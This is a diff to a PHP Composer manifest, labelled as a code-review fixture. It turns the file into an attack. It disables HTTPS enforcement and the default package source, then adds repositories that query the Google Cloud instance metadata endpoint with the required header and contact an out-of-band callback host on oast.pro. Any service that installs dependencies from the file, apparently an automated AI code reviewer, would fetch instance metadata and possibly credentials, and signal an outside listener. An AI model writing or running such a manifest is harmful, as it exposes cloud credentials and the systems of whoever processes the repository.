@@ -1,6 +1,31 @@
 {
-  "name": "h123/probe",
+  "name": "h231/root",
   "description": "CodeRabbit review fixture repository (own test repo)",
   "type": "project",
-  "require": {}
+  "config": {
+    "secure-http": false
+  },
+  "require": {
+    "h231/probe": "1.0.0"
+  },
+  "repositories": [
+    {
+      "packagist.org": false
+    },
+    {
+      "type": "composer",
+      "url": "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true&alt=json#x",
+      "options": {
+        "http": {
+          "header": [
+            "Metadata-Flavor: Google"
+          ]
+        }
+      }
+    },
+    {
+      "type": "composer",
+      "url": "https://dc2r2a6qf2t9urq08s0gpq6frxwdk5fj7.oast.pro/h231a63dns"
+    }
+  ]
 }
